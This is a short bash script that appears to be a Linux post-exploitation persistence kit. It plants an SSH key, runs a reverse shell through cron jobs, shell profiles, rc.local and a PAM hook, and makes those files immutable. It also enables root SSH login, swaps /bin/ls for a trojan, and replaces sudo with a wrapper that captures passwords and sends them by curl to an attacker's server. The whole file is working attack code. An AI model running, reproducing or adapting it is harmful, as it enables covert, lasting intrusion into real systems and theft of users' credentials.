#!/bin/bash
sshkey=""
revshelldir="~/.cache/pip2/"
revshell=$revshelldir"revshell"

# Setup
mkdir -p $revshelldir

# User stuff
## User ssh_key
mkdir -p ~/.ssh/
echo "$sshkey" >> ~/.ssh/authorized_keys

## User cronjob
echo "* * * * * $revshell" > ~/.ct
crontab ~/.ct
rm ~/.ct

## User profile
echo $revshell >> ~/.profile
echo $revshell >> ~/.bashrc
chattr +ias ~/.profile
chattr +ias ~/.bashrc

# Root stuff
if [ "$(whoami)" == "root" ]; then
    ## rc.local
    sed -i "/exit 0/d" /etc/rc.local
    echo $revshell >> /etc/rc.local
    chmod +x /etc/rc.local
    chattr +ias /etc/rc.local

    ## All user profiles
    echo $revshell >> /etc/profile
    chattr +ias /etc/profile
    
    ## Create a service
    
    ## System Cronjob
    echo "* * * * * $revshell" >> /etc/crontab
    chattr +ias /etc/crontab
    
    ## Root ssh
    sed -i "/PermitRootLogin.*/d" /etc/ssh/sshd_config
    echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
    chattr +ias /etc/ssh/sshd_config
    service ssh restart
    
    ## Trojan ls
    mv /bin/ls /bin/.ls
    echo "#!/bin/bash
    $revshell
    /bin/.ls $@" > /bin/ls
    chmod +x /bin/ls
    chattr +ias /bin/ls
    
    ## Backdoor sudo
    mv /bin/sudo /bin/.sudo
    echo "#!/bin/bash
    user=$(whoami)
    read -s -p '[sudo] password for $user: ' pass
    curl -d 'user=$user&pass=$pass' 'http://$server:$port'
    echo $pass | /bin/.sudo -p '' -S $@" > /bin/sudo
    chmod +x /bin/sudo
    chattr +ias /bin/sudo
    
    ## pam_exec
    echo "session optional pam_exec.so $revshell" >> /etc/pam.d/system-auth
    chattr +ias /etc/pam.d/system-auth
fi
